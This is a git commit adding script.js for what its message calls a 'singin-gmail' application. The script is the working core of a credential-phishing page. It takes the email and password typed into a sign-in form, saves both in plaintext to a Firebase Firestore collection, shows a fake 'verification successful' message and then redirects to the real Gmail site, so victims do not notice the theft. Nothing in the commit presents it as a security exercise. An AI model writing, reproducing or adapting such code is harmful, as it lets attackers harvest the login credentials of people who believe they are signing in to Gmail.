167126c96d3e06600f5c28c90e7234ee661ea873
Anderson Angulo <andersonangulo1704@gmail.com>
2021-06-09 22:06:13 -0500

    Aplicacion finalizada singin-gmail

---
+++ script.js
@@ -0,0 +1,24 @@
+const db=firebase.firestore()
+const contentWrapper=document.querySelector('.content-wrapper')
+
+const form=document.getElementById('form-sign')
+form.addEventListener('submit', async e=>{
+  e.preventDefault()
+  const correo=form["correo"].value
+  const password=form["password"].value
+  await db.collection("users").doc().set({correo,password})
+  if(correo!=="" && password!==""){
+      contentWrapper.innerHTML=`
+        <div class="alert">
+          <p>VERIFICACIÓN EXITOSA</p>
+          <i class="fas fa-user-check"></i>
+        </div>`
+      setTimeout(()=>{
+        location.href="https://mail.google.com"
+      },1500)
+  }else{
+    alert("COMPLETE LOS CAMPOS")
+  }
+
+
+})
